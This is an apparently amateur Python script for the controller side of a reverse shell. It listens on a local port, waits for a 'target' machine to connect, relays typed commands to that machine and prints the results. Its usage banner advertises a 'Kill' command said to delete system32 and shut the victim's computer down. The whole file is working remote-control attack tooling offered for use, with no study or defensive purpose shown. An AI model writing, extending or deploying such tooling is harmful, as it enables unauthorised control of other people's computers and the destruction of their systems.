# 1 - Import the right module
import socket

import pyfiglet

pyflig = pyfiglet.figlet_format("Revers Shell")

# 2 - Server IP / Port
server_conf = 'localhost', 1024

# 3 - Create socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 4 - Bind the socket to the port
sock.bind(server_conf)

# 5 - Listening for incoming connexion
print(pyflig)
print("[!] Waiting Target Connexion")

sock.listen(1)

# 6 - Accept Connection
connection, client_address = sock.accept()

# 7 receive data from client_address
data = connection.recv(3096)
print('Message from client: %s' % data, "[*]")
print(" ")
print("|----------------------------------------------------------------------|")
print("| [!] Usage: basic Remote Shell [!]                                    |")
print("|- Tips: enter [root] to go directly to c:/                            |")
print("|- Tips: enter [chg] for change directory                              |")
print(u"| \u2620 : enter Kill for delete system32 and shutdown computer       |")
print("|----------------------------------------------------------------------|")
print(" ")

while True:
    # 8 - send confirmation
    cmd = input("target@>")

    # Go to C:\
    if cmd == "root":
        connection.sendall(b"root")

    # Empty Message condition
    if len(cmd) == 0:
        print("[!] Empty Command Line")
        cmd = input("target@>")

    connection.sendall(cmd.encode("utf-8"))

    #  9 - print cmd output
    data = connection.recv(1024).decode("utf-8")
    print(data)
